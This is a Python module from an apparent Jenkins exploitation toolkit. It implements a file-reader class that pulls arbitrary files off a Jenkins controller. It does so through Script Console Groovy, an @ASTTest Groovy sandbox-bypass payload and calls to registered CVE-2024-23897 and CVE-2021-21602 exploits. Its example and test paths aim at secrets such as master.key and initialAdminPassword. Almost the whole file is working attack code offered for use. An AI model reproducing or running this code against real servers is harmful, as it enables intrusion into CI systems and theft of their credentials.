"""
Generic File Reading Utilities for Jenkins Exploitation.

Provides abstraction layer for reading files from Jenkins controller
via various exploitation techniques (CVE-2024-43044, CVE-2024-23897, CVE-2021-21602, etc.)
"""

from typing import Any, Callable, Optional


class JenkinsFileReader:
    """
    Generic file reader abstraction for Jenkins exploitation.

    This class provides a unified interface for reading files from the Jenkins
    controller regardless of the underlying exploitation technique.

    Supported Methods:
        - CVE-2024-43044: ClassLoaderProxy#fetchJar via agent
        - CVE-2024-23897: CLI arbitrary file read
        - CVE-2021-21602: Workspace browser path traversal
        - CVE-2022-43401: Groovy sandbox bypass file read
        - Script Console: Direct file read via Groovy

    Example:
        reader = JenkinsFileReader(session, method='cve_2024_43044')
        content = reader.read_file('/var/jenkins_home/secrets/master.key')
    """

    def __init__(
        self,
        session: Any,
        method: str = 'auto',
        exploit_callback: Optional[Callable[[str], bytes]] = None
    ) -> None:
        """
        Initialize file reader.

        Args:
            session: JenkinsSession instance
            method: File read method ('auto', 'cve_2024_43044', 'cve_2024_23897',
                   'script_console', 'groovy_sandbox')
            exploit_callback: Custom file read callback function
        """
        self.session = session
        self.method = method
        self.exploit_callback = exploit_callback

    def read_file(self, file_path: str) -> Optional[bytes]:
        """
        Read a file from Jenkins controller.

        Args:
            file_path: Absolute path to file on Jenkins controller

        Returns:
            File content as bytes, or None if read fails
        """
        if self.exploit_callback:
            try:
                return self.exploit_callback(file_path)
            except Exception:
                return None

        if self.method == 'auto':
            for method_name in ['script_console', 'groovy_sandbox', 'cve_2024_23897']:
                try:
                    content = self._read_via_method(file_path, method_name)
                    if content:
                        self.method = method_name
                        return content
                except Exception:
                    continue
            return None
        else:
            return self._read_via_method(file_path, self.method)

    def _read_via_method(self, file_path: str, method: str) -> Optional[bytes]:
        """
        Read file using specific method.

        Args:
            file_path: File path to read
            method: Method name

        Returns:
            File content or None
        """
        if method == 'script_console':
            return self._read_via_script_console(file_path)
        elif method == 'groovy_sandbox':
            return self._read_via_groovy_sandbox(file_path)
        elif method == 'cve_2024_23897':
            return self._read_via_cli(file_path)
        elif method == 'cve_2024_43044':
            return self._read_via_agent_fetchjar(file_path)
        elif method == 'cve_2021_21602':
            return self._read_via_workspace_browser(file_path)
        else:
            return None

    def _read_via_script_console(self, file_path: str) -> Optional[bytes]:
        """
        Read file via Script Console (requires admin access).

        Args:
            file_path: File path to read

        Returns:
            File content as bytes
        """
        try:
            groovy_script = f"""
                def file = new File('{file_path}')
                if (file.exists()) {{
                    return file.bytes.encodeBase64().toString()
                }} else {{
                    return null
                }}
            """.strip()

            response = self.session.post(
                "/scriptText",
                data={"script": groovy_script}
            )

            if response.status_code == 200 and response.text.strip():
                import base64
                return base64.b64decode(response.text.strip())
            return None
        except Exception:
            return None

    def _read_via_groovy_sandbox(self, file_path: str) -> Optional[bytes]:
        """
        Read file via Groovy sandbox bypass (CVE-2022-43401, CVE-2024-34144).

        Args:
            file_path: File path to read

        Returns:
            File content as bytes
        """
        try:
            groovy_payload = f"""
@groovy.transform.ASTTest(value={{
    def content = new File('{file_path}').bytes.encodeBase64().toString()
    println content
}})
class FileRead {{}}
            """.strip()

            response = self.session.post(
                "/scriptText",
                data={"script": groovy_payload}
            )

            if response.status_code == 200 and response.text.strip():
                import base64
                return base64.b64decode(response.text.strip())
            return None
        except Exception:
            return None

    def _read_via_cli(self, file_path: str) -> Optional[bytes]:
        """
        Read file via Jenkins CLI (CVE-2024-23897).

        Args:
            file_path: File path to read

        Returns:
            File content as bytes
        """
        try:
            from jenkins_breaker.modules import exploit_registry

            cve_2024_23897 = exploit_registry.get('CVE-2024-23897')
            if not cve_2024_23897:
                return None

            result = cve_2024_23897.run(self.session, file_path=file_path)

            if result.status == 'success' and result.data:
                content = result.data.get('content', '')
                if isinstance(content, str):
                    return content.encode('utf-8')
                return content
            return None
        except Exception:
            return None

    def _read_via_agent_fetchjar(self, file_path: str) -> Optional[bytes]:
        """
        Read file via agent ClassLoaderProxy#fetchJar (CVE-2024-43044).

        Args:
            file_path: File path to read

        Returns:
            File content as bytes
        """
        return None

    def _read_via_workspace_browser(self, file_path: str) -> Optional[bytes]:
        """
        Read file via workspace browser path traversal (CVE-2021-21602).

        Args:
            file_path: File path to read

        Returns:
            File content as bytes
        """
        try:
            from jenkins_breaker.modules import exploit_registry

            cve_2021_21602 = exploit_registry.get('CVE-2021-21602')
            if not cve_2021_21602:
                return None

            result = cve_2021_21602.run(self.session, file_path=file_path)

            if result.status == 'success' and result.data:
                content = result.data.get('content', '')
                if isinstance(content, str):
                    return content.encode('utf-8')
                return content
            return None
        except Exception:
            return None

    def read_text_file(self, file_path: str, encoding: str = 'utf-8') -> Optional[str]:
        """
        Read a text file and return as string.

        Args:
            file_path: File path to read
            encoding: Text encoding (default: utf-8)

        Returns:
            File content as string or None
        """
        content = self.read_file(file_path)
        if content:
            try:
                return content.decode(encoding)
            except Exception:
                return None
        return None

    def read_multiple_files(self, file_paths: list[str]) -> dict[str, Optional[bytes]]:
        """
        Read multiple files and return as dictionary.

        Args:
            file_paths: List of file paths to read

        Returns:
            Dictionary mapping file paths to content (or None if failed)
        """
        results = {}
        for file_path in file_paths:
            results[file_path] = self.read_file(file_path)
        return results

    def test_file_read(self) -> bool:
        """
        Test if file read capability is available.

        Returns:
            True if can read files, False otherwise
        """
        test_paths = [
            '/etc/hostname',
            '/var/jenkins_home/secrets/initialAdminPassword',
            '/proc/version'
        ]

        for test_path in test_paths:
            content = self.read_file(test_path)
            if content and len(content) > 0:
                return True

        return False
